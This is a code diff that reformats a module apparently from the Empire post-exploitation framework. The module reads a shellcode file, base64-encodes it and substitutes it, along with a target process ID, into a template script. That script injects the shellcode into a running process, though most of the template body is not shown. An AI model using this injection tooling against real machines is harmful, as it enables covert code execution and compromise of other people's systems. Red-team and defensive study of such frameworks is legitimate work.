@@ -2,8 +2,7 @@ from __future__ import print_function
 
 import base64
 import os
-from builtins import object
-from builtins import str
+from builtins import object, str
 from typing import Dict
 
 from empire.server.common.module_models import PydanticModule
@@ -12,15 +11,21 @@ from empire.server.utils.module_util import handle_error_message
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
-        
-        processID = params['PID']
-        shellcodeBinPath = params['Shellcode']
+    def generate(
+        main_menu,
+        module: PydanticModule,
+        params: Dict,
+        obfuscate: bool = False,
+        obfuscation_command: str = "",
+    ):
+
+        processID = params["PID"]
+        shellcodeBinPath = params["Shellcode"]
 
         if not os.path.exists(shellcodeBinPath):
             return handle_error_message("[!] Shellcode bin file not found.")
 
-        f = open(shellcodeBinPath, 'rb')
+        f = open(shellcodeBinPath, "rb")
         shellcode = base64.b64encode(f.read())
         f.close()
 
@@ -132,7 +137,7 @@ def run():
     print("Injected shellcode into process successfully!")
 run()
 """
-        script = script.replace('[SC]', shellcode)
-        script = script.replace('[PID]', processID)
+        script = script.replace("[SC]", shellcode)
+        script = script.replace("[PID]", processID)
 
         return script
